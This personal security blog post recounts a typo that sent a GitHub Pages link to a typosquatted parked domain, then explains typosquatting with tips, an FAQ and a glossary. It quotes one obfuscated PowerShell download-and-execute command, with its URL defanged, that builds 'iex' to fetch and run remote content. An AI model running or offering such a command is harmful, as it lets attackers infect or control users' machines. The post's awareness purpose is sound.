---
layout: post
title: When a Simple Typo Almost Broke Trust - A Cybersecurity Near-Miss
date: '2025-04-19 16:01 +0100'
author: b3rdma
description: >-
  A real near miss happened today when I manually typed a link to my blog site
  that had a typo. Here is what I learnt from the experience.
image: null
categories:
  - Cybersecurity
  - Personal
tags:
  - typosquatting
  - mistakes
  - infosec
  - lessons
  - blog
media_subpath: /img/typo/
---
## Contents

<!-- toc -->

- [The Incident](#the-incident)
- [What I Thought Might Have Happened](#what-i-thought-might-have-happened)
- [Some Other Results of the URL Redirect](#some-other-results-of-the-url-redirect)
- [Typosquatting: Why This Is a Real Threat](#typosquatting-why-this-is-a-real-threat)
- [What I Took Away From This](#what-i-took-away-from-this)
- [Tips to Avoid Similar Mistakes](#tips-to-avoid-similar-mistakes)
- [Final Thoughts](#final-thoughts)
- [Frequently Asked Questions (FAQ)](#frequently-asked-questions-faq)
- [Glossary](#glossary)

<!-- tocstop -->

Sometimes the smallest mistakes can teach us the biggest lessons. Recently, I
accidentally shared a typoed link to my GitHub Pages blog in a Discord chat.
What followed was a serious wake-up call about typosquatting, trust, and the
potential for social engineering – even from well-intentioned sources.

## The Incident

I meant to share the link `https://b3rdma.github.io`

But I accidentally typed the link `hxxps://b3rdma[.]guthub[.]io`

The typo is simply the extra _u_ in github where the _i_ should be, making it
_guthub_ instead of _github_.

<!-- prettier-ignore-start -->
> Note that I have 'defanged' the potentially malicious link above to prevent
> accidental clicking by visitors. This is a common practice when sharing
> suspicious URLs for investigation.
{: .prompt-warning }
<!-- prettier-ignore-end -->

This typo redirected my contact to a sketchy parked domain:
`hxxp://ww1[.]guthub[.]io`. If the link with the typo is clicked multiple times,
each redirect may be to a different target site.

A _parked domain_ is one that has been registered but is not actively used; it
often displays placeholder pages or advertisements. That alone was concerning
enough; but it did not stop there. In the same conversation, they replied with
a PowerShell command that looked suspiciously like something out of a
hacking/CTF challenge:

<!-- prettier-ignore-start -->
```powershell
powershell -c "$e=[char]0x69+[char]0x65+[char]0x78;$u=[uri]'hxxps://iplogger[.]co/2y14e7.avi';&($e)(iwr $u)"
```
{: .nolineno }
<!-- prettier-ignore-end -->

<!-- prettier-ignore-start -->

> Note that I have also defanged the URI in the PowerShell command above for the
> same reasons previously mentioned; only here it is arguably more important.
{: .prompt-warning }
<!-- prettier-ignore-end -->

This command attempts to download and run a script from a remote site; a common
technique used by attackers to infect machines or steal information.

**What does this mean?**

- The command builds the word `iex` (short for `Invoke-Expression`), which tells
  PowerShell to execute code it downloads.
- It then tries to download a file from a suspicious URL and run it immediately.
- If run, this could allow an attacker to take control of the system or spy on
  activity.

Was this a joke? A test? Or a genuine attempt to download malware? The
uncertainty was deeply uncomfortable.

## What I Thought Might Have Happened

- Did the typoed domain automatically execute a harmful payload?
- Did I unknowingly send a malicious script?
- Was my contact tricked into running a remote PowerShell command?

Thankfully, **none of those things actually happened**. After some
investigation:

- [x] The URL led to a parked page with no active malicious code
- [x] VirusTotal flagged the link as clean (0/94 detections), as did URLScan
- [x] No alarming results from a google search although the redirects may be too
      numerous to research in just a hour or so.
- [x] There was no evidence of automatic downloads or script execution

![URLScan.io results of a malicious URL](urlscan_results.webp){: width="700" height="400" }
_Results from URLScan.io on the potentially malicious URL_

## Some Other Results of the URL Redirect

I made sure I had real-time protection enabled, firewall rules in place and used
a windows VM to look at the behaviour of the redirect. Standard behaviour of
suspect sites that redirect to a site that throws pop-ups, adverts, and other
click-me call-to-actions. Here are a few screenshots:

The Safari browser on macOS does a good job of warning users of the potentially
malicious site that waits ahead. One needs to take extra actions to actually
visit the site and that is not advisable unless you have a good reason.

![Screenshot of warning in the Safari browser](example_on_macos_safari.webp){: width="700" height="400" }
_Safari browser immediately warns of the Deceptive Website_

In the first example in the Edge browser on Windows, the page is calling for
visitors to renew their licence for McAfee. Note the typically use of urgency
and impending doom to pressure visitors to take action. The machine is not
infected unless clicks and other actions are taken. It is also interesting to
note that the URL has tracking identifiers, network metadata, referral data, and
has some obfuscation. This is behaviour associated with fraud campaigns,
malvertising, adware and phishing.

![First example of a redirect in the Edge browser in Windows](example_in_edge_browser.webp){: width="700" height="400" }
_First redirect that happened in the Edge browser in Windows_

The second example in the Edge browser shows a website with a load of adverts
and a 'new user bonus'! Do not clink on things like that, please. It should be
noted that the exact same link with the typo was used, but the end target was
different. I did limited tests and do not know how many different pages the link
would lead to. Some may have more malicious intent than others.

![Second example of a redirect in the Edge browser in Windows](another_example_in_edge_browser.webp){: width="700" height="400" }
_Second redirect from the same typoed link in the Edge browser_

**Important to know:** No system executes PowerShell scripts just by visiting a
webpage. Modern browsers and operating systems do not allow scripts to run
automatically without explicit user permission or action. This is a key security
feature to protect users from drive-by attacks.

## Typosquatting: Why This Is a Real Threat

<!-- prettier-ignore-start -->
> _Typosquatting_ is a form of cyberattack where attackers register lookalike domains, hoping to catch mistyped URLs.
{: .prompt-info }
<!-- prettier-ignore-end -->

These domains often:

- Host malicious downloads
- Impersonate login pages to steal credentials
- Trigger redirections, pop-ups, or scripts in vulnerable browsers

It is a subtle but dangerous vector, because humans make mistakes.

## What I Took Away From This

This whole experience rattled me because I have pride in my reputation as having
the highest levels of honesty and integrity. This was a genuine cybersecurity
near-miss; it made me think differently about how fragile trust can be,
perception, and the importance of precision.

Even a harmless typo can:

- Damage trust with colleagues or peers
- Lead someone to a malicious or shady site
- Become a launchpad for further attacks such as phishing or malware infections

## Tips to Avoid Similar Mistakes

- **Use system-wide text replacements** - For example, macOS allows you to auto-correct common domain typos (e.g. `guthub.io` to `github.io`)

- **Double-check typed URLs** - Always verify links before sharing, especially in public or professional channels

- **If you see something suspicious, do not execute it** - Assume any link, file, or command is unsafe until you have confirmed otherwise

- **Use tools like [urlscan.io](https://urlscan.io) or
  [VirusTotal](https://www.virustotal.com)** to check suspicious domains or links before visiting them

- **Remember: mistakes happen. It is how we handle them that counts** - Transparency and accountability build more trust than pretending nothing
  happened

## Final Thoughts

This was a humbling experience, and I hope it helps others be more mindful of
small details because in cybersecurity, they often matter most.

Have you ever had a cybersecurity near-miss like this? Feel free to reach out;
I would be interested to hear your story.

## Frequently Asked Questions (FAQ)

**Q: Can simply visiting a malicious website infect my computer?**
A: Generally, no. Modern browsers and operating systems prevent automatic
execution of scripts like PowerShell commands without your explicit permission
or action.

**Q: What should I do if I receive a suspicious command or link?**
A: Do not run any commands or open links unless you trust the source. Use tools
like VirusTotal or urlscan.io to check suspicious URLs before interacting with
them.

**Q: How can I protect myself from typosquatting attacks?**
A: Always double-check URLs before clicking or sharing them. Use browser
extensions or system text replacements to correct common typos automatically.

**Q: What is the risk of running a PowerShell command from an unknown source?**
A: Running such commands can download and execute malware, steal data, or give
attackers control over your system. Always verify commands before executing
them.

**Q: Are antivirus tools enough to stop these attacks?**
A: Antivirus software is important but not foolproof. Combining it with cautious
behaviour, up-to-date software, and good security practices offers better
protection.

## Glossary

**CTF (Capture The Flag)** A type of cybersecurity challenge or competition
where participants solve puzzles or hacking tasks to "capture flags", often
used for learning and practice.

**Invoke-Expression (`iex`)** A PowerShell command that runs code contained in
a string; often used by attackers to execute downloaded scripts directly in
memory.

**Parked Domain** A registered internet domain that is not actively used; it
usually shows placeholder content or advertisements.

**PowerShell** A command-line shell and scripting language used in Windows to
automate tasks; it can be powerful but also abused by attackers.

**Typosquatting** A cyberattack technique where attackers register domains
similar to popular websites, hoping users will mistype URLs and visit malicious
sites.

**VirusTotal** An online service that scans files and URLs with multiple
antivirus engines to check for malware or malicious content.

